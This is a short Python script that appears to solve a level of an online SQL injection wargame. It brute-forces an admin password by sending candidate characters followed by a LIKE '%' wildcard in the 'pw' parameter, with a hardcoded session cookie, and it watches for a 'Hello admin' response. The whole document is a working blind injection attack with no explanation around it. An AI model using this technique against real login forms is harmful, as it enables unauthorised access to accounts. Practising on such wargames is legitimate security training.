import requests

password=''
for admin_len in range(1) :
    for admin_pass in range(33,126) :
        URL='http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?'
        query={'pw': '83'+chr(admin_pass)+'%'}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            print("SUC")
            break
    print("one cycle complete")